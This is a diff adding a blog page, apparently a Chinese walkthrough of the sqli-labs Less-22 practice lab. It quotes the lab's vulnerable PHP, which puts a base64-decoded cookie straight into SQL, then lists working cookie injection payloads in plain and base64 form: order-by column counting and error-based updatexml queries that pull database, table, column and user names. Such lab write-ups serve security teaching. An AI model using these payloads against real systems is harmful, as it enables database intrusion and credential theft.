@@ -1,0 +1,32 @@
+<hr>
+<h2 id="title-less22url-https-www-yuque-com-u29002979-ep2zrx-apfen7iyy03crkry"><a href="#title-less22url-https-www-yuque-com-u29002979-ep2zrx-apfen7iyy03crkry" class="headerlink" title="title: less22url: https://www.yuque.com/u29002979/ep2zrx/apfen7iyy03crkry"></a>title: less22<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/apfen7iyy03crkry">https://www.yuque.com/u29002979/ep2zrx/apfen7iyy03crkry</a></h2><pre><code class="bash">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
+
+$cookee = base64_decode($cookee);
+            $cookee1 = &#39;&quot;&#39;. $cookee. &#39;&quot;&#39;;
+            echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;
+            $sql=&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;
+</code></pre>
+<p>与Less21的唯一区别在于此关闭合方式为双引号”</p>
+<p>成功登录后发现在Cookie处登录的信息被进行了加密，</p>
+<blockquote>
+<p>YOUR USER AGENT IS : Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;101.0.0.0 Safari&#x2F;537.36<br>YOUR IP ADDRESS IS : 192.168.31.119<br>DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE<br>YOUR COOKIE : uname &#x3D; YWRtaW4&#x3D; and expires: Wed 16 Nov 2022 - 20:58:46<br>Your Login name:admin<br>Your Password:admin<br>Your ID:8</p>
+</blockquote>
+<p><a name="DsPkr"></a></p>
+<h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p><code>uname=admin&quot; order by 4-- +</code><br>先将语句进行base64加密，再进行注入，<br><code>uname=YWRtaW4iIG9yZGVyIGJ5IDQtLSAr</code></p>
+<blockquote>
+<p>Issue with your mysql: Unknown column ‘4’ in ‘order clause’</p>
+</blockquote>
+<p><a name="Tcgou"></a></p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre><code class="bash">爆破数据库名
+uname=admin&quot; union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)-- +
+uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKS0tICs=
+爆破数据表名
+uname=admin&quot; union select 1,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)-- +
+uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYSA9IGRhdGFiYXNlKCkpLDB4N2UpLDEpLS0gKw==
+爆破字段名
+uname=admin&quot; union select 1,2,updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#39;users&#39; limit 8,1),0x7e),1)-- +
+uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCAoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIGxpbWl0IDgsMSksMHg3ZSksMSktLSAr
+爆破字段
+uname=admin&quot; union select 1,2,updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)-- +
+uname=admin&quot; union select 1,2,updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)-- +
+</code></pre>
